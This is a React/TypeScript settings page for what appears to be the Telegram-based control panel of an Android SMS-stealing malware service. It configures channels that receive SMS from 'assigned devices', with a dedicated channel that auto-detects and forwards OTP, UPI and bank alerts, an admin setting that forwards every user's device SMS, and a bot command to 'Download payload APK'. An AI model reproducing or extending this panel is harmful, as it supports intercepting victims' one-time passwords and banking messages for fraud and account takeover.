import { useState, useEffect } from 'react';
import { db } from '@/lib/firebase';
import { ref, onValue, set, remove } from 'firebase/database';
import { Layout } from '@/components/layout';
import { useAuth } from '@/lib/auth';
import { useToast } from '@/hooks/use-toast';
import {
  Send, Bell, CheckCircle, XCircle, Loader2,
  Plus, Trash2, AlertCircle, Shield, Settings,
  MessageSquare, ChevronRight, IndianRupee, BellOff, BellRing
} from 'lucide-react';
import { Reveal, PageHeader, GlassCard, PillButton } from '@/components/ui/bezel';

const API_BASE = (import.meta.env.VITE_API_URL ?? '').replace(/\/$/, '');

async function apiFetch(path: string, opts?: RequestInit) {
  const res = await fetch(`${API_BASE}/api${path}`, opts);
  const data = await res.json().catch(() => ({}));
  if (!res.ok) throw new Error(data.error || 'Request failed');
  return data;
}

interface NotifyRule {
  keyword: string;
  channel: string;
}

export function TelegramSettings() {
  const { isAdmin, userId } = useAuth();
  const { toast } = useToast();

  const [globalChannel, setGlobalChannel] = useState('');
  const [savedGlobalChannel, setSavedGlobalChannel] = useState('');
  const [savingGlobal, setSavingGlobal] = useState(false);

  const [personalChannel, setPersonalChannel] = useState('');
  const [savedPersonalChannel, setSavedPersonalChannel] = useState('');
  const [savingPersonal, setSavingPersonal] = useState(false);

  const [financeChannel, setFinanceChannel] = useState('');
  const [savedFinanceChannel, setSavedFinanceChannel] = useState('');
  const [savingFinance, setSavingFinance] = useState(false);

  const [rules, setRules] = useState<NotifyRule[]>([]);
  const [newKeyword, setNewKeyword] = useState('');
  const [newChannel, setNewChannel] = useState('');
  const [addingRule, setAddingRule] = useState(false);

  const [botUsername, setBotUsername] = useState<string | null>(null);

  const normalizeChannel = (val: unknown): string => {
    if (typeof val === 'string') return val;
    if (val && typeof val === 'object') {
      const obj = val as Record<string, unknown>;
      if (typeof obj.channelId === 'string') return obj.channelId;
    }
    return '';
  };

  useEffect(() => {
    const globalRef = ref(db, 'config/smsChannel');
    const unsub1 = onValue(globalRef, (snap) => {
      const v = normalizeChannel(snap.val());
      setSavedGlobalChannel(v);
      setGlobalChannel(v);
    });

    if (userId) {
      const personalRef = ref(db, `config/userChannels/${userId}/sms`);
      const unsub2 = onValue(personalRef, (snap) => {
        const v = normalizeChannel(snap.val());
        setSavedPersonalChannel(v);
        setPersonalChannel(v);
      });

      const financeRef = ref(db, `config/userChannels/${userId}/finance`);
      const unsub3 = onValue(financeRef, (snap) => {
        const v = normalizeChannel(snap.val());
        setSavedFinanceChannel(v);
        setFinanceChannel(v);
      });

      const rulesRef = ref(db, `config/userChannels/${userId}/rules`);
      const unsub4 = onValue(rulesRef, (snap) => {
        if (snap.exists()) {
          const data = snap.val() as Record<string, NotifyRule | null | undefined>;
          const rulesList = Object.values(data).filter(
            (r): r is NotifyRule => !!r && typeof r.keyword === 'string' && typeof r.channel === 'string'
          );
          setRules(rulesList);
        } else {
          setRules([]);
        }
      });

      return () => { unsub1(); unsub2(); unsub3(); unsub4(); };
    }
    return () => unsub1();
  }, [userId]);

  const saveGlobalChannel = async () => {
    setSavingGlobal(true);
    try {
      await apiFetch('/auth/set-channel', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ telegramId: userId, channelId: globalChannel.trim() || null }),
      });
      toast({ title: globalChannel.trim() ? '✅ Global Channel Set' : '✅ Global Channel Removed' });
    } catch (err: any) {
      toast({ title: 'Error', description: err.message, variant: 'destructive' });
    } finally {
      setSavingGlobal(false);
    }
  };

  const savePersonalChannel = async () => {
    if (!userId) return;
    setSavingPersonal(true);
    try {
      if (personalChannel.trim()) {
        await set(ref(db, `config/userChannels/${userId}/sms`), personalChannel.trim());
      } else {
        await remove(ref(db, `config/userChannels/${userId}/sms`));
      }
      toast({ title: personalChannel.trim() ? '✅ Personal Channel Set' : '✅ Personal Channel Removed' });
    } catch (err: any) {
      toast({ title: 'Error', description: err.message, variant: 'destructive' });
    } finally {
      setSavingPersonal(false);
    }
  };

  const saveFinanceChannel = async () => {
    if (!userId) return;
    setSavingFinance(true);
    try {
      if (financeChannel.trim()) {
        await set(ref(db, `config/userChannels/${userId}/finance`), financeChannel.trim());
      } else {
        await remove(ref(db, `config/userChannels/${userId}/finance`));
      }
      toast({ title: financeChannel.trim() ? '✅ Finance Channel Set' : '✅ Removed' });
    } catch (err: any) {
      toast({ title: 'Error', description: err.message, variant: 'destructive' });
    } finally {
      setSavingFinance(false);
    }
  };

  const addRule = async () => {
    if (!newKeyword.trim() || !newChannel.trim() || !userId) return;
    setAddingRule(true);
    try {
      const key = newKeyword.trim().toLowerCase().replace(/\s+/g, '_');
      await set(ref(db, `config/userChannels/${userId}/rules/${key}`), {
        keyword: newKeyword.trim(),
        channel: newChannel.trim(),
      });
      setNewKeyword('');
      setNewChannel('');
      toast({ title: '✅ Rule Added' });
    } catch (err: any) {
      toast({ title: 'Error', description: err.message, variant: 'destructive' });
    } finally {
      setAddingRule(false);
    }
  };

  const removeRule = async (keyword: string) => {
    if (!userId) return;
    const key = keyword.toLowerCase().replace(/\s+/g, '_');
    await remove(ref(db, `config/userChannels/${userId}/rules/${key}`));
    toast({ title: 'Rule removed' });
  };

  const SectionTitle = ({ icon: Icon, title, sub }: { icon: any; title: string; sub?: string }) => (
    <div className="mb-5">
      <h2 className="text-xs font-bold uppercase tracking-widest text-muted-foreground flex items-center gap-2">
        <Icon className="w-3.5 h-3.5 text-[#a78bfa]" strokeWidth={1.6} /> {title}
      </h2>
      {sub && <p className="text-xs text-muted-foreground/80 mt-1.5">{sub}</p>}
    </div>
  );

  const ChannelInput = ({
    value, onChange, onSave, saving, placeholder = '-100xxxxxxxxxx', label, helpText
  }: {
    value: string; onChange: (v: string) => void; onSave: () => void;
    saving: boolean; placeholder?: string; label: string; helpText?: string;
  }) => (
    <div className="space-y-2.5">
      <label className="text-[10px] font-bold uppercase tracking-wider text-muted-foreground block">{label}</label>
      <div className="flex flex-col sm:flex-row gap-2.5">
        <input
          type="text"
          value={value}
          onChange={(e) => onChange(e.target.value)}
          placeholder={placeholder}
          className="field flex-1 font-mono"
        />
        <button
          onClick={onSave}
          disabled={saving}
          className="btn-island shrink-0 bg-[#8b5cf6] text-white px-5 py-3 text-sm shadow-[0_10px_30px_-12px_rgba(139,92,246,0.7)] hover:bg-[#7c3aed] disabled:opacity-40 disabled:pointer-events-none"
        >
          {saving ? <Loader2 className="w-4 h-4 animate-spin" strokeWidth={1.8} /> : <Send className="w-4 h-4" strokeWidth={1.8} />}
          {saving ? 'Saving...' : value.trim() ? 'Set' : 'Remove'}
        </button>
      </div>
      {helpText && <p className="text-[10px] text-muted-foreground/80">{helpText}</p>}
    </div>
  );

  return (
    <Layout>
      <div className="max-w-3xl mx-auto">
        <PageHeader eyebrow="Relay Channels" title="Telegram Settings" description="Configure notification channels and alert rules" />

        {/* Setup guide */}
        <Reveal className="mb-6">
          <div className="flex items-start gap-3.5 p-4 rounded-2xl bg-white/[0.03] border border-white/[0.08] text-sm text-muted-foreground">
            <AlertCircle className="w-4 h-4 text-[#a78bfa] flex-shrink-0 mt-0.5" strokeWidth={1.6} />
            <div className="space-y-1.5">
              <p className="font-semibold text-foreground">Setup Guide</p>
              <p>1. Create a Telegram channel or group</p>
              <p>2. Add the bot as admin (with permission to post messages)</p>
              <p>3. Paste the Channel ID here (e.g. <code className="text-[#a78bfa] text-xs font-mono">-100xxxxxxxxxx</code>)</p>
              <p>4. Or use the <code className="text-[#a78bfa] text-xs font-mono">/setchannel</code> bot command</p>
            </div>
          </div>
        </Reveal>

        {/* Personal SMS Channel */}
        <Reveal className="mb-6">
          <GlassCard className="rounded-[1.75rem]" innerClassName="rounded-[1.75rem] p-7">
            <SectionTitle icon={MessageSquare} title="My SMS Channel" sub="SMS from your assigned devices will be forwarded to this channel" />
            {savedPersonalChannel && (
              <div className="mb-4 bg-[#34d399]/[0.06] border border-[#34d399]/20 rounded-2xl p-3 flex items-center gap-2 text-sm">
                <CheckCircle className="w-4 h-4 text-[#34d399] shrink-0" strokeWidth={1.6} />
                <span className="text-foreground">Active: <code className="text-[#a78bfa] font-mono">{savedPersonalChannel}</code></span>
              </div>
            )}
            <ChannelInput value={personalChannel} onChange={setPersonalChannel} onSave={savePersonalChannel} saving={savingPersonal} label="Channel ID" helpText="Only SMS from devices assigned to your account will appear here" />
          </GlassCard>
        </Reveal>

        {/* Finance Alert Channel */}
        <Reveal className="mb-6" delay={60}>
          <GlassCard className="rounded-[1.75rem]" innerClassName="rounded-[1.75rem] p-7">
            <SectionTitle icon={IndianRupee} title="Finance Alert Channel" sub="Only financial SMS (OTP, UPI, debit, credit, bank alerts) will be forwarded here" />
            {savedFinanceChannel && (
              <div className="mb-4 bg-[#34d399]/[0.06] border border-[#34d399]/20 rounded-2xl p-3 flex items-center gap-2 text-sm">
                <CheckCircle className="w-4 h-4 text-[#34d399] shrink-0" strokeWidth={1.6} />
                <span className="text-foreground">Active: <code className="text-[#a78bfa] font-mono">{savedFinanceChannel}</code></span>
              </div>
            )}
            <ChannelInput value={financeChannel} onChange={setFinanceChannel} onSave={saveFinanceChannel} saving={savingFinance} label="Finance Channel ID" helpText="OTP, UPI payments, and bank transaction SMS are auto-detected and forwarded here" />
          </GlassCard>
        </Reveal>

        {/* Keyword Alert Rules */}
        <Reveal className="mb-6" delay={120}>
          <GlassCard className="rounded-[1.75rem]" innerClassName="rounded-[1.75rem] p-7">
            <SectionTitle icon={Bell} title="Keyword Alert Rules" sub="Forward SMS to a specific channel when a keyword is matched" />

            {rules.length > 0 && (
              <div className="space-y-2.5 mb-5">
                {rules.map((rule) => (
                  <div key={rule.keyword} className="flex items-center justify-between bg-white/[0.03] border border-white/[0.08] rounded-2xl px-4 py-3">
                    <div className="flex items-center gap-3 min-w-0">
                      <span className="bg-white/[0.05] text-[#a78bfa] text-xs font-bold px-2.5 py-1 rounded-full border border-white/[0.1] flex-shrink-0">
                        {rule.keyword}
                      </span>
                      <ChevronRight className="w-3.5 h-3.5 text-muted-foreground flex-shrink-0" strokeWidth={1.6} />
                      <code className="text-xs text-foreground font-mono truncate">{rule.channel}</code>
                    </div>
                    <button
                      onClick={() => removeRule(rule.keyword)}
                      className="ml-3 p-1.5 rounded-xl hover:bg-[#ef4444]/10 hover:text-[#f87171] text-muted-foreground transition-colors duration-500 ease-smooth flex-shrink-0"
                    >
                      <Trash2 className="w-3.5 h-3.5" strokeWidth={1.6} />
                    </button>
                  </div>
                ))}
              </div>
            )}

            <div className="flex flex-col sm:flex-row gap-2.5">
              <input type="text" value={newKeyword} onChange={(e) => setNewKeyword(e.target.value)} placeholder="Keyword (e.g. HDFC, OTP)" className="field flex-1 min-w-0" />
              <input type="text" value={newChannel} onChange={(e) => setNewChannel(e.target.value)} placeholder="Channel ID" className="field flex-1 min-w-0 font-mono" />
              <button
                onClick={addRule}
                disabled={addingRule || !newKeyword.trim() || !newChannel.trim()}
                className="btn-island shrink-0 bg-[#8b5cf6] text-white px-5 py-3 text-sm shadow-[0_10px_30px_-12px_rgba(139,92,246,0.7)] hover:bg-[#7c3aed] disabled:opacity-40 disabled:pointer-events-none"
              >
                {addingRule ? <Loader2 className="w-4 h-4 animate-spin" strokeWidth={1.8} /> : <Plus className="w-4 h-4" strokeWidth={1.8} />}
                Add Rule
              </button>
            </div>
          </GlassCard>
        </Reveal>

        {/* Global SMS Channel — Admin Only */}
        {isAdmin && (
          <Reveal className="mb-6" delay={180}>
            <GlassCard className="rounded-[1.75rem]" innerClassName="rounded-[1.75rem] p-7">
              <SectionTitle icon={Shield} title="Global SMS Channel (Admin)" sub="ALL devices' SMS from every user will be forwarded here — admin-level setting" />
              {savedGlobalChannel ? (
                <div className="mb-4 bg-[#34d399]/[0.06] border border-[#34d399]/20 rounded-2xl p-3 flex items-center gap-2 text-sm">
                  <BellRing className="w-4 h-4 text-[#34d399] shrink-0" strokeWidth={1.6} />
                  <span className="text-foreground">Active: <code className="text-[#a78bfa] font-mono">{savedGlobalChannel}</code></span>
                </div>
              ) : (
                <div className="mb-4 bg-white/[0.03] border border-white/[0.08] rounded-2xl p-3 flex items-center gap-2 text-sm text-muted-foreground">
                  <BellOff className="w-4 h-4 shrink-0" strokeWidth={1.6} /> Global forwarding is currently off
                </div>
              )}
              <ChannelInput value={globalChannel} onChange={setGlobalChannel} onSave={saveGlobalChannel} saving={savingGlobal} label="Global Channel ID" helpText="SMS from all devices of all users will be forwarded to this channel" />
            </GlassCard>
          </Reveal>
        )}

        {/* Bot Commands Reference */}
        <Reveal delay={240}>
          <GlassCard className="rounded-[1.75rem]" innerClassName="rounded-[1.75rem] p-7">
            <SectionTitle icon={Settings} title="Bot Commands Reference" />
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 text-sm">
              {[
                { cmd: '/setchannel -100xxx', desc: 'Set global SMS forward channel' },
                { cmd: '/removechannel', desc: 'Remove global channel' },
                { cmd: '/apk', desc: 'Download payload APK' },
                { cmd: '/reset_password', desc: 'Reset panel password' },
                { cmd: '/stats', desc: 'View bot & device stats' },
                { cmd: '/adduser ID days email pass', desc: 'Add new user (admin only)' },
              ].map(({ cmd, desc }) => (
                <div key={cmd} className="bg-white/[0.03] border border-white/[0.07] rounded-2xl p-4">
                  <p className="text-muted-foreground text-xs mb-1.5">{desc}</p>
                  <code className="text-[#a78bfa] font-mono text-xs">{cmd}</code>
                </div>
              ))}
            </div>
          </GlassCard>
        </Reveal>
      </div>
    </Layout>
  );
}
